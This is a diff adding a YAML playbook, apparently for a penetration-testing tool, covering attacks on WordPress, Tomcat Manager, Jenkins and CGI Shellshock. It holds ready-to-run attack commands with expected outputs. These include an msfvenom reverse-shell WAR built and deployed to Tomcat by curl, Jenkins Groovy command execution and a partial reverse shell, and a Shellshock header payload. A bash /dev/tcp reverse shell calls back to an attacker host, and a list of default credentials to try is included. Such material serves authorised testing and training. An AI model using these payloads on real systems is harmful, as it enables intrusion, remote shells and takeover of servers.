@@ -1,0 +1,81 @@
+id: common-apps
+name: Attacking Common Web Applications & CMS
+category: web
+description: 'Methodology for attacking enterprise web applications and CMS platforms: WordPress, Tomcat Manager, Jenkins Script Console, Drupalgeddon, and CGI Shellshock.'
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+  - http-alt
+tags:
+  - wordpress
+  - tomcat
+  - jenkins
+  - drupal
+  - shellshock
+  - cms
+steps:
+  - id: apps-wpscan-enum
+    title: WordPress Plugin & User Enumeration (WPScan)
+    phase: enumeration
+    purpose: Scan WordPress installation for vulnerable plugins, themes, and enumerate usernames via REST API and author archives.
+    command: wpscan --url {{TARGET_URL}} --enumerate p,t,u --plugins-detection aggressive
+    expected_output:
+      - '[+] WordPress version 5.8 identified'
+      - '[i] Plugin: simple-file-list (v4.2.2) - Unauthenticated RCE'
+      - '[+] Users: admin, editor, webmaster'
+    common_mistakes:
+      - Not using `--plugins-detection aggressive` if passive mode misses custom plugins.
+    if_success: Vulnerable plugin found! Search Exploit-DB for public Metasploit/Python exploit.
+    if_failure: No vulnerable plugins. Try password bruteforce on `xmlrpc.php` or `wp-login.php`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+  - id: apps-tomcat-war-upload
+    title: Tomcat Manager Authenticated WAR File Upload
+    phase: exploitation
+    purpose: Deploy a malicious `.war` payload to Tomcat Manager GUI/API (`/manager/html` or `/manager/text`) to spawn a reverse shell.
+    command: msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST|10.10.14.2}} LPORT=4444 -f war -o revshell.war && curl -u "{{USERNAME|tomcat}}:{{PASSWORD|s3cret}}" -T revshell.war "{{TARGET_URL}}/manager/text/deploy?path=/revshell&update=true" && curl -s "{{TARGET_URL}}/revshell/"
+    expected_output:
+      - OK - Deployed application at context path [/revshell]
+      - '[Kali Listener: Connection received from {{TARGET}}]'
+    common_mistakes:
+      - 'Test default Tomcat credentials: `tomcat:s3cret`, `admin:admin`, `tomcat:tomcat`, `admin:password`.'
+    if_success: Java reverse shell spawned on Kali listener! Stabilize shell.
+    if_failure: Manager access denied (403/401). Check AJP port 8009 (Ghostcat CVE-2020-1938).
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+  - id: apps-jenkins-groovy-rce
+    title: Jenkins Script Console Groovy Command Execution
+    phase: exploitation
+    purpose: Execute arbitrary Java/Groovy code on the Jenkins controller or agents via the `/script` administrative console.
+    command: curl -s -u "{{USERNAME|admin}}:{{PASSWORD|password}}" -d "script=println+'whoami'.execute().text" "{{TARGET_URL}}/scriptText"
+    expected_output:
+      - jenkins
+      - nt authority\system
+      - root
+    common_mistakes:
+      - 'To spawn a reverse shell, execute: `String host="{{LHOST|10.10.14.2}}";int port=4444;Process p=new ProcessBuilder("/bin/bash","-i").redirectErrorStream(true).start();...`.'
+    if_success: Command executed! Spawn interactive reverse shell.
+    if_failure: Script console restricted. Check for unauthenticated CLI / CVE-2024-23897.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins
+  - id: apps-shellshock-cgi
+    title: CGI Shellshock Remote Code Execution (CVE-2014-6271)
+    phase: exploitation
+    purpose: Inject bash function definition payloads into HTTP User-Agent / Referer headers to execute commands via vulnerable CGI scripts.
+    command: 'curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c ''id; whoami''" "{{TARGET_URL}}/cgi-bin/test.cgi"'
+    expected_output:
+      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    common_mistakes:
+      - Ensure target endpoint is an executable `.cgi` or `.sh` script inside `/cgi-bin/`.
+    if_success: 'Shellshock RCE confirmed! Trigger reverse shell: `/bin/bash -i >& /dev/tcp/{{LHOST|10.10.14.2}}/4444 0>&1`.'
+    if_failure: CGI script not vulnerable or bash patched. Check other web endpoints.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
